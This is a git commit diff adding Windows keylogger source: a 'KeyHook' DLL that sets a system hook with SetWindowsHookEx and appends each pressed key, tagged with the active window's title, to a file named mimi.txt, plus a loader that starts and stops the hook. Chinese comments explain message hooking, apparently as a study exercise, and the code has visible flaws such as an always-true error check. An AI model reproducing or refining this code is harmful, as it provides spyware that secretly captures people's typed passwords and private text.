b7243498c339d586c5167036a04c51dc534c42de
rm <1325550166@qq.com>
2024-05-06 20:05:13 +0800

    完整代码提交

---
+++ KeyHook/dllmain.cpp
@@ -0,0 +1,118 @@
+﻿// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include "pch.h"
+#include <Windows.h>
+#include <stdio.h>
+#define DEF_PROCESS_NAME "notepad.exe"
+
+HINSTANCE g_hInstance = NULL;
+HHOOK g_hHook = NULL;
+HWND g_hWnd = NULL;
+
+
+BOOL APIENTRY DllMain(HMODULE  hinstDll,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        g_hInstance = hinstDll;
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+LRESULT CALLBACK MyMessageProcrss(int Code, WPARAM wParam, LPARAM lParam)
+{
+	/*MessageBox(NULL, L"有人按键", NULL, 2);
+
+	switch (Code)
+	{
+	case WM_USER + 1:
+	{
+		MessageBox(NULL, L"自定义消息启动", NULL, NULL);
+	}
+	break;
+	default:
+		break;
+	}*/
+
+	//拿到当前窗口的标题
+	HWND hWnd = GetActiveWindow();
+	if (hWnd == NULL)
+	{
+		//拿顶层窗口
+		hWnd = GetForegroundWindow();
+		if (hWnd == NULL)
+		{
+			//没有窗口 哪就返回了
+			return CallNextHookEx(g_hHook, Code, wParam, lParam);
+		}
+	}
+
+	//在拿标题
+	char szWindowTextBuff[256] = { 0 };
+	GetWindowTextA(hWnd, szWindowTextBuff, 255);
+	//拿到当前按下的键盘上的字符
+	if (Code < 0 || Code == HC_NOREMOVE)
+	{
+		return CallNextHookEx(g_hHook, Code, wParam, lParam);
+	}
+	/*if (lParam & 0x40000000)
+	{
+		return CallNextHookEx(g_hHook, Code, wParam, lParam);
+	}*/
+	//获取按键上的字符
+	char keytextbuff[256] = { 0 };
+	GetKeyNameTextA(lParam, keytextbuff, 255);
+
+	//保存到文件
+	//创建文件或打开文件
+	FILE* file;
+	errno_t err = fopen_s(&file, "f:\\mimi.txt", "a");
+	if (~err)
+	{
+		////写入数据
+		char buff[256] = { 0 };
+		sprintf_s(buff, "%s-----%s\n", szWindowTextBuff, keytextbuff);
+
+		////写入文件
+		fwrite(buff, 1, strlen(buff), file);
+		//关闭文件
+		fclose(file);
+
+		return CallNextHookEx(g_hHook, Code, wParam, lParam);
+	}
+	
+	MessageBoxA(NULL, "打开文件失败", NULL, NULL);
+	return CallNextHookEx(g_hHook, Code, wParam, lParam);
+	
+
+}
+
+#ifdef __cplusplus
+extern "C" {
+#endif // __cplusplus
+    __declspec(dllexport) void HookStart()
+    {
+        g_hHook = SetWindowsHookEx(WH_MSGFILTER, MyMessageProcrss, GetModuleHandle(L"KeyHook"), 0);
+		if (g_hHook == NULL)
+		{
+			MessageBox(NULL, L"下钩错误", NULL, 2);
+			return;
+		}
+		MessageBox(NULL, L"下钩成功", NULL, 2);
+		return ;
+    }
+    __declspec(dllexport) void HookStop()
+    {
+        UnhookWindowsHookEx(g_hHook);
+        g_hHook = NULL;
+    }
+#ifdef __cplusplus
+}
+#endif // __cplusplus
--- SetWindowsHook/SetWindowsHook.cpp
+++ SetWindowsHook/SetWindowsHook.cpp
@@ -1,20 +1,60 @@
 ﻿// SetWindowsHook.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
 //
+/*
+Windows操作系统向用户提供GUI，它以事件驱动方式工作，在操作系统中借助键盘，鼠标，选择菜单，按钮，以及移动鼠标，
+改变窗口大小与位置等都是事件，发生这样的事件时，OS会把事先定义好的消息发送给相应的应用程序，应用程序分析收到
+的信息后执行相应动作，也就是说，敲击键盘时，消息会从OS移动到应用程序，所谓的“消息钩子”就在此间偷看这些消息
+为了帮助各位进一步理解它，下面以键盘消息为例说明
 
-#include <iostream>
+SetWindowsHookEx(
+    int idHook,
+    HOOKPROC lpfn,
+    HINSTANCE hMod.
+    DWORD dwThreadId
+)
+
+*/
+#include <stdio.h>
+#include <Windows.h>
+#include <conio.h>
+
+#define DEF_DLL_NAME "KeyHook.dll"
+#define DEF_HOOKSTART "HookStart"
+#define DEF_HOOKSTOP  "HookStop"
+
+typedef void(*PFN_HOOKSTART)();
+typedef void(*PFN_HOOKSTOP)();
 
 int main()
 {
-    std::cout << "Hello World!\n";
+    HMODULE hDll = NULL;
+    PFN_HOOKSTART HookStart = NULL;
+    PFN_HOOKSTOP HookStop = NULL;
+
+    //加载key HooK.DLL
+    hDll = LoadLibraryA(DEF_DLL_NAME);
+    if (hDll)
+    {
+        //获取导出函数地址
+        HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);
+        HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);
+
+        //开始勾取
+        HookStart();
+        //等待直到用户输入“q”
+        printf("Press 'q' to quit! \n");
+        while (_getch() != 'q')
+        {
+
+        }
+
+        //停止勾取
+        HookStop();
+
+        //卸载KetHook.DLL
+        FreeLibrary(hDll);
+    }
+   
+
 }
 
-// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
-// 调试程序: F5 或调试 >“开始调试”菜单
-
-// 入门使用技巧: 
-//   1. 使用解决方案资源管理器窗口添加/管理文件
-//   2. 使用团队资源管理器窗口连接到源代码管理
-//   3. 使用输出窗口查看生成输出和其他消息
-//   4. 使用错误列表窗口查看错误
-//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
-//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
